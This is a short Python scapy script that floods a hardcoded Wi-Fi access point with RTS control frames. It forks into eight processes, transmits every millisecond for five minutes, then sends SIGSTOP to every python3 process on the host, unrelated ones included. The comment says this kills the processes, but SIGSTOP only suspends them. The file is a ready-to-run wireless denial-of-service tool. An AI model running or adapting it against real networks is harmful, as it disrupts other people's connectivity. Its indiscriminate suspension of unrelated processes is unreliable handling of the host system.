from scapy.all import *
import os
import psutil
import signal
from time import * #Importing required modules


iface = 'wlan0'
sender = '' #MAC of the sending device
conf.use_pcap = True
monitor = True

dot11 = Dot11(proto=0, FCfield=0, type=1, subtype=11, addr1=sender, addr2='2C:54:2D:38:85:35', ID=1) #Specifiying the type of packet, subtype=11 is for RTS
                                                                                                     #addr1 is for sending card, addr2 will be for AP
frame = RadioTap()/dot11 #Building the packet as 'frame'
frame.show() #Printing the packet to be transmitted

start = time() #Start a timer

fork1 = os.fork() #3 forks, creating a total of 8 processes
fork2 = os.fork()
fork3 = os.fork()


if fork1 != 0 and fork2 != 0 and fork3 != 0:
    sleep(300) #Specifiy the time to run the packet transmission before ending
    print(os.getpid())
    for process in psutil.process_iter (): #Iterate through PIDs
        if "python3" not in process.name() or process.pid == os.getpid(): #If the process is not python3 or one of our fork PIDs
            continue 
        ID = process.pid # ID of the process
        print (ID)
        os.kill(ID,signal.SIGSTOP) #Kill the PIDs that we identified to be python3 above

else:
    ID = os.getpid()
    sendp(frame, iface=iface, inter=0.001, loop=1, verbose=0) #Sending the frame, the transmission interval and loop OR count

print(f'{time() - start} seconds') #Display time taken

